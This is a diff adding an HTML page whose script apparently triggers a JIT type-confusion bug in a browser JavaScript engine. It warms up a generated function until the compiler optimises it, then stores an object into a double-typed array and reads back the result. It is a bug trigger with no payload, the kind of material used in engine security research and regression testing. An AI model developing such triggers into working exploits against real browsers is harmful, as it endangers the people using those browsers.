@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+let code = 'function trigger(x, arr, val) {\n';
+for (let i = 0; i < 1100; i++) {
+  code += `  if (x === ${i}) return ${i};\n`;
+}
+code += `
+  arr[0] = val;
+  for (let i = 0; i < 1; i++) {
+    return arr[1];
+  }
+}
+return trigger;
+`;
+
+let trigger = new Function(code)();
+
+// Warm up trigger
+let dummy = [1.1, 2.2, 3.3];
+let obj = {};
+
+for (let i = 0; i < 1000; i++) {
+  let a = [1.1, 2.2, 3.3];
+  trigger(-1, a, 1.1);
+}
+
+console.log("Warmed up!");
+
+// Now test with transition
+let test_arr = [1.1, 2.2, 3.3];
+// arr is PACKED_DOUBLE_ELEMENTS. val is obj.
+let res = trigger(-1, test_arr, obj);
+console.log("Result:", res, typeof res);
+</script>
+</body>
+</html>
